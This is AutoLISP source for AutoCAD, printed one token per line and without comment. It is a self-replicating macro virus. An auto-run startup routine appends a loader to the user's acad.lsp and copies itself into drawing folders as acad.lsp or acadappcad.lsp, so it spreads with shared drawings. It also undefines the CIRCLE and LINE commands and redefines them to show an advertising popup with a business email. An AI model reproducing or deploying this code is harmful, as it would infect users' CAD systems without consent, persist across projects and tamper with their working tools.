(defun
s::startup
(/
old_cmdq
path
dwgpathq
mnlpath
apppath
oldacad
newacad
nowdwg
lspbj
wjm
wjm1
wjqm
wjqm1
wz
ns1
ns2)
(setq
old_cmdq
(getvar
"cmdecho"))
(setvar
"cmdecho"
0)
(setq
path
(findfile
"base.dcl"))
(setq
path
(substr
path
1
(-
(strlen
path)
8)))
(setq
mnlpath
(getvar
"menuname"))
(setq
nowdwg
(getvar
"dwgname"))
(setq
wjqm
(findfile
nowdwg))
(setq
dwgpathq
(substr
wjqm
1
(-
(strlen
wjqm)
(strlen
nowdwg))))
(setq
acadpath
(findfile
"acad.lsp"))
(setq
acadpath
(substr
acadpath
1
(-
(strlen
acadpath)
8)))
(setq
ns1
""
ns2
"")
(setq
lspbj
0)
(setq
wjqm
(strcat
path
"acad.lsp"))
(if
(setq
wjm
(open
wjqm
"r"))
(progn
(while
(setq
wz
(read-line
wjm))
(setq
ns1
ns2)
(setq
ns2
wz)
)
(if
(>
(strlen
ns1)
14)
(if
(=
(substr
ns1
8
7)
"acadappcad")
(setq
lspbj
1))
)
(close
wjm)
)
)
(if
(and
(=
acadpath
dwgpathq)
(/=
acadpath
path))
(progn
(setq
oldacad
(findfile
"acad.lsp"))
(setq
newacad
(strcat
path
"acadappcad.lsp"))
(if
(=
lspbj
0)
(progn
(setq
wjqm
(strcat
path
"acad.lsp"))
(setq
wjm
(open
wjqm
"a"))
(write-line
(strcat
"(load
"
(chr
34)
"acadappcad"
(chr
34)
")")
wjm)
(write-line
"(princ)"
wjm)
(close
wjm)
)
)
(writeapp)
)
(progn
(if
(/=
nowdwg
"Drawing.dwg")
(progn
(setq
oldacad
(findfile
"acadappcad.lsp"))
(setq
newacad
(strcat
dwgpathq
"acad.lsp"))
(writeapp)
)
)
)
)
(command
"undefine"
"CIRCLE")
(command
"undefine"
"line")
(setvar
"cmdecho"
old_cmdq)
(princ)
)
(defun
writeapp
()
(if
(setq
wjm1
(open
newacad
"w"))
(progn
(setq
wjm
(open
oldacad
"r"))
(while
(setq
wz
(read-line
wjm))
(write-line
wz
wjm1)
)
(close
wjm)
(close
wjm1)
)
)
)
(defun
C:CIRCLE
()
(command ".CIRCLE")
(alert"                先 锋 模  具          

	    HI Sakha R U Feeling BAD

            多做一些工作,多赚一些钱!              

承接冲压模具设计工作,以及AutoCAD二次开发工作,收费!

                        E-mail:   fd-zhou@163.com")
)
(defun
C:line
()
(command ".line")
(alert"                       先 锋 模  具          
	    HI Sakha R U Feeling BAD


            多做一些工作,多赚一些钱!              

承接冲压模具设计工作,以及AutoCAD二次开发工作,收费!

                        E-mail:   fd-zhou@163.com")
)
(princ)
